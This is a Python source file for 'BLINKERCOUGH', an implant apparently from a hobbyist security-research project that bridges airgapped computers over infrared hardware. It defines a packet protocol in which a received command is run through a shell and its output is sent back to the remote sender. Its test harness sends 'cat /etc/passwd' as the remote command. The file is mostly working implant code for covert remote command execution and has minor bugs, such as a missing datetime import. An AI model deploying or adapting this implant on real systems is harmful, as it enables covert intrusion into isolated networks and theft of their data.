#!/usr/bin/python
#
# BLINKERCOUGH: NSA Playset implant for IR bridging of airgap
#
# Copyright (C) 2015  Hacker, J.R. <r00tkillah@gmail.com>
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA

import time
import serial
import binascii
import select
import sys
import os
import struct
import random
import select
import subprocess
from smbus import SMBus

class SerialDevice:
    def __init__(self, device_path, baud):
        self.reset_serial_port(device_path)
        self.ser = serial.Serial(device_path, baud)
        self.reset_serial_port(device_path)
        os.system("stty -F %s echoe echok echoctl echoke" % device_path)
        self.reset_arduino()
        self.reset_serial_port(device_path)
        time.sleep(1)
        # work around a bug in pyserial where it leaves the port with funny
        # flags that keep things from working
        self.wait_for_startup()
        time.sleep(1)

    def reset_serial_port(self, device_path):
        os.system("stty -F %s echoe echok echoctl echoke" % device_path)

    def read_input(self):
        """reads any input and prings out any debug info"""
        stop_polling = False
        inputs = [self.ser]
        outputs = []
        while not stop_polling:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for fd in readable:
                line = fd.readline()
                if line.startswith("DBG"):
                    sys.stdout.write(line)
                elif line.strip():
                    return line.strip()

    def wait_for_startup(self):
        while True:
            response = self.ser.readline().strip()
            if "Starting" in response:
                return
            else:
                print response

    def reset_arduino(self):
        self.ser.setDTR(False)
        time.sleep(.2)
        self.ser.flushInput()
        self.ser.flushOutput()
        self.ser.setDTR(True)
        time.sleep(0.1)

    def read_register(self, address):
        cmd = "READ %02x\r\n" % address
#        print cmd.strip()
        self.ser.write(cmd)
        buf = ""
        inputs = [self.ser]
        outputs = []
        stop_polling = False
        response = None
        while not stop_polling:
            readable, writable, exceptional = select.select(inputs, outputs, inputs, 1)
            for fd in readable:
                char = fd.read()
                buf += char
                if char == '\n':
                    if buf.startswith("DBG"):
                        sys.stdout.write(buf)
                        buf = ""
                    elif buf.strip():
                       response = buf.strip()
                       stop_polling = True
            if not readable:
                # if we timeout, try again
                self.ser.write(cmd)
        decoded_response = None
        try:
            decoded_response = binascii.unhexlify(response)
        except TypeError:
            print "couldn't unhexlify '%s'" % response
            sys.exit(1)
        return decoded_response

    def write_register(self, address, data):
        cmd = "WRITE %02x %02x\r\n" % (address, data)
        self.ser.write(cmd)
        self.ser.flush()
        time.sleep(0.01)

class i2cDevice:
    def __init__(self, bus_number):
        self.BC_addr = 0x25
        self.bus = SMBus(bus_number)

    def read_register(self, address):
        self.bus.write_byte(self.BC_addr, address)
        return self.bus.read_byte(self.BC_addr)

    def write_register(self, address, data):
        self.bus.write_byte_data(self.BC_addr, address, data)


class BlinkerCough:
    data_len = 128-(2+2+1+2)
    fmt = '=HHB'+str(data_len)+'sH'
    receive_hook = None # to be called when packet recvd

    def __init__(self, device):
        """you pass in either a serial thing or an i2c thing"""
        self.device = device
        self.address = self.get_address()

    def send_raw(self, data):
        """to be used for a whole packet"""
        i = 0
        for d in data:
            as_byte = struct.unpack('B', d)[0]
            sys.stdout.write("[%03d] 0x%02x " % (i, as_byte))
            if (i+1) % 5 == 0:
                sys.stdout.write('\n')
            i += 1
            self.device.write_register(3, as_byte)
        sys.stdout.write('\n')


    def send(self, destination, data):
        print "sending from 0x%04x to 0x%04x" % (self.address, destination)
        frame = struct.pack(BlinkerCough.fmt, self.address, destination,
                            0x00, #type; hops
                            data,
                            0x00)  # crc
        self.send_raw(frame)

    def poll(self):
        """call this regularly to look for incoming data"""
        data = ''
        i = 0
        while True:
            rx_depth = struct.unpack('B', self.device.read_register(0))[0]
            if rx_depth == 0:
                break
            c = (self.device.read_register(1))
            data += c
            print "i=%d d=%s" % (i, binascii.hexlify(c))
            time.sleep(0.01)
            i+= 1
        if data:
            (source, dest, hops, data, crc) = struct.unpack(BlinkerCough.fmt, data[::-1])
            print "source: %04x" % source
            print "dest: %04x" % dest
            print "hops: %d" % hops
            if BlinkerCough.receive_hook:
                print "calling BC recv hook"
                BlinkerCough.receive_hook(source, data)

    def poll_for(self, seconds):
        sys.stdout.write("chilling for %d seconds" % seconds)
        sys.stdout.flush()
        then = datetime.now()
        while True:
            self.poll()
            if (datetime.now() - then).total_seconds() >= seconds:
                break
        print "done"

    def poll_forever(self):
        while True:
            self.poll()
            time.sleep(0.5)
            sys.stdout.write(".")
            sys.stdout.flush()


    def get_address(self):
        lower = self.device.read_register(4)
        upper = self.device.read_register(5)
        return struct.unpack('<H', lower+upper)[0]

    def set_address(self, address):
        encoded = struct.pack('>H', address)
        halves = struct.unpack('BB', encoded)
        self.device.write_register(4, halves[0])
        self.device.write_register(5, halves[1])

class CommandPacket:
    """represents a comand packet.  Mostly just serialize and deserialize"""
    fmt = '<HB'+str(BlinkerCough.data_len - 3)+'s'
    magic = 0x1234

    def __init__(self, submagic, data):
        self.submagic = submagic
        self.data = data

    def pack(self):
        return struct.pack(CommandPacket.fmt, CommandPacket.magic,
                           self.submagic, self.data)

    @classmethod
    def unpack(cls, data):
        (magic, submagic, unpacked_data) = struct.unpack(CommandPacket.fmt, data)
        print "magic: 0x%04x submagic: 0x%02x" % (magic, submagic)
        print "data: ", binascii.hexlify(unpacked_data)
        if magic != CommandPacket.magic:
            print "magic was %d not %d" % (magic, CommandPacket.magic)
            return None
        return cls(submagic, unpacked_data)

class CommandRunPacket:
    fmt = '<118s'
    submagic = 0x1

    def __init__(self, cmd):
        self.cmd = cmd

    def pack(self):
        zeros = 112 - len(self.cmd)
        if zeros > 1:
            self.cmd += '\x00'
            self.cmd += '\xFF'*zeros
        return struct.pack(CommandRunPacket.fmt, self.cmd)

    @classmethod
    def unpack(cls, data):
        (unpacked_data) = struct.unpack(CommandRunPacket.fmt, data)
        cmd = ''
        for c in unpacked_data[0]:
            if c == '\x00':
                break
            cmd += c
        return cls(cmd)

class CommandResponsePacket:
    fmt = '<H116s'
    submagic = 0x2

    def __init__(self, handle):
        self.handle = handle

    def pack(self):
        return struct.pack(CommandResponsePacket.fmt,
                           self.handle, '\xff'*116)

    @classmethod
    def unpack(cls, data):
        (handle, padding) = struct.unpack(CommandResponsePacket.fmt,
                                          data)
        return cls(handle)

class CommandOutputPacket:
        fmt = '<H116s'
        submagic = 0x3

        def __init__(self, handle, output):
            self.handle = handle
            self.output = output

        def pack(self):
            zeros = 116 - len(self.output)
            if zeros > 1:
                self.output += '\x00'
                self.output += '\xff'*zeros
            return struct.pack(CommandOutputPacket.fmt,
                               self.handle,
                               self.output)

        @classmethod
        def unpack(cls, data):
            (handle, output) = struct.unpack(CommandOutputPacket.fmt, data)
            out = ''
            for c in output:
                if c == '\x00':
                    break
                out += c
            return cls(handle, out)

class CommandTerminatedPacket:
    fmt = '<HH114s'
    submagic = 0x4

    def __init__(self, handle, returncode):
        self.handle = handle
        self.returncode = returncode

    def pack(self):
        return struct.pack(CommandTerminatedPacket.fmt,
                           self.handle,
                           self.returncode,
                           '\xff'*114)

    @classmethod
    def unpack(cls, data):
        (handle, returncode, padding) = struct.unpack(CommandTerminatedPacket.fmt, data)
        return cls(handle, returncode)


class CommandRunner:
    send_hook = None
    output_hook = None
    terminated_hook = None

    def __init__(self, bc):
        self.handle = None
        self.state = 'idle'
        self.bc = bc

    def run_remote_command(self, dest, cmd):
        self.dest = dest
        run_pkt = CommandRunPacket(cmd)
        cmd_pkt = CommandPacket(CommandRunPacket.submagic, run_pkt.pack())
        assert(CommandRunner.send_hook)
        CommandRunner.send_hook(dest, cmd_pkt.pack())

    def chunkstring(self, string, length):
        return list((string[0+i:length+i] for i in range(0, len(string), length)))

    def on_recv(self, source, data):
        cmd_pkt = CommandPacket.unpack(data)
        if cmd_pkt.submagic == CommandRunPacket.submagic:
            # we are to run the command
            run_pkt = CommandRunPacket.unpack(cmd_pkt.data)
            print "cmd to run is:", run_pkt.cmd
            print "source is 0x%04x" % source
            rng = random.SystemRandom()
            handle = rng.randrange(0, pow(2,16))
            print "my handle is 0x%02x" % handle
            cmdresp = CommandResponsePacket(handle)
            cmdpkt =  CommandPacket(CommandResponsePacket.submagic, cmdresp.pack())
            CommandRunner.send_hook(source, cmdpkt.pack())

            print "chilling to give other guy chance to think about things"
            then = datetime.now()
            while True:
                self.bc.poll()
                if (datetime.now() - then).total_seconds() >= 15:
                    break
            print "done"
            p = subprocess.Popen(run_pkt.cmd, shell=True, stderr = subprocess.STDOUT, stdout = subprocess.PIPE)
            (stdout, stderr) = p.communicate()
            outchunks = self.chunkstring(stdout, 116)
            print "command run.  chunks of output", len(outchunks)
            for chunk in outchunks:
                outpkt = CommandOutputPacket(handle, chunk)
                cmdpkt = CommandPacket(CommandOutputPacket.submagic, outpkt.pack())
                print "sending output packet"
                CommandRunner.send_hook(source, cmdpkt.pack())
                print "chilling to give other guy chance to think about things"
                then = datetime.now()
                while True:
                    self.bc.poll()
                    if (datetime.now() - then).total_seconds() >= 15:
                        break
                print "done"
            termpkt = CommandTerminatedPacket(handle, p.returncode)
            cmdpkt = CommandPacket(CommandTerminatedPacket.submagic, termpkt.pack())
            print "chilling to give other guy chance to think about things"
            then = datetime.now()
            while True:
                self.bc.poll()
                if (datetime.now() - then).total_seconds() >= 15:
                    break
            print "done"
            CommandRunner.send_hook(source, cmdpkt.pack())

        if cmd_pkt.submagic == CommandResponsePacket.submagic:
            print "packet is commadn response packet"
            resp_packet = CommandResponsePacket.unpack(cmd_pkt.data)
            self.handle = resp_packet.handle
            print "handle is %04x" % self.handle
            
        elif cmd_pkt.submagic == CommandOutputPacket.submagic:
            out_pkt = CommandOutputPacket.unpack(cmd_pkt.data)
            if CommandRunner.output_hook:
                CommandRunner.output_hook(out_pkt.output)
        elif cmd_pkt.submagic == CommandTerminatedPacket.submagic:
            term_pkt = CommandTerminatedPacket.unpack(cmd_pkt.data)
            if CommandRunner.terminated_hook:
                CommandRunner.terminated_hook(term_pkt.returncode)

if __name__ == "__main__":
    # test harness of sorts for commandpacket
    def output_hook(output):
        print "output:", output

    def terminated_hook(code):
        print "terminated:", code

    def send_hook(dest, data):
        print "send_hook"
        print "dest:", dest
        print "data:", binascii.hexlify(data)

    cr = CommandRunner()
    CommandRunner.send_hook = staticmethod(send_hook)
    CommandRunner.output_hook = staticmethod(output_hook)
    CommandRunner.terminated_hook = staticmethod(terminated_hook)
    cr.run_remote_command(0x1234, 'cat /etc/passwd')
    cr.on_recv(0x1234, CommandPacket(CommandResponsePacket.submagic, CommandResponsePacket(12).pack()).pack())
    print "recv'd handle is:", cr.handle
    print "command output is"
    cr.on_recv(0x1234, CommandPacket(CommandOutputPacket.submagic, CommandOutputPacket(12,'I am output').pack()).pack())
    cr.on_recv(0x1234, CommandPacket(CommandRunPacket.submagic, CommandRunPacket("cat /etc/passwd").pack()).pack())
    cr.on_recv(0x1234, CommandPacket(CommandTerminatedPacket.submagic, CommandTerminatedPacket(12, 4).pack()).pack())

    print "running a command"
    cr.on_recv(0x1234, CommandPacket(CommandRunPacket.submagic, CommandRunPacket('cat /etc/passwd').pack()).pack())
